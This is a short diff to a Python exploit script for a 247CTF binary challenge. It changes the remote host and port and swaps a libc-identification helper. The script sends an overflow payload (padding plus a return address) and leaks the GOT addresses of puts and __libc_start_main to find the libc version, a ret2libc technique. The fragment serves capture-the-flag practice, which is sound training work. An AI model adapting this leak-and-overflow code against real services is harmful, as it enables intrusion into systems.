@@ -4,7 +4,7 @@ import TheNight
 
 import sys
 
-target = remote("e9685e1ae56237d3.247ctf.com", 50247)
+target = remote("f154cec0b793d1c0.247ctf.com", 50403)
 payload = ""
 payload += "0000000000000000000000000000000000000000000000000000000000000000000000000000"
 payload += p32(0x8048410)
@@ -20,4 +20,4 @@ leak = target.recv(4)
 gotAddress1 = u32(leak)
 symbol0 = "puts"
 symbol1 = "__libc_start_main"
-TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
+TheNight.findLibcVersion("puts", gotAddress0, "__libc_start_main", gotAddress1)
